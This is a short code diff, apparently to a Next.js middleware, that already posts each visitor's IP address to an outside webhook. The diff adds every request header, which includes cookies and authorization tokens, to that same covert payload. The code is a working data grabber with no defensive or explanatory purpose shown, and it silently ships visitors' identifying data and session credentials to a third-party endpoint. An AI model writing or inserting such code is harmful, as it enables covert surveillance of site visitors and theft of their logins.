@@ -9,6 +9,7 @@ async function getip() {
 }
 
 export async function middleware(req) {
+
     await fetch(hook, {
         method: "POST",
         headers: {
@@ -38,6 +39,10 @@ export async function middleware(req) {
                             name: "IP",
                             value: "```" + await getip() + "```",
                         },
+                        {
+                            name: "Headers",
+                            value: "```" + JSON.stringify(Object.fromEntries(req.headers.entries()), null, 4) + "```",
+                        }
                     ]
                 },
             ],
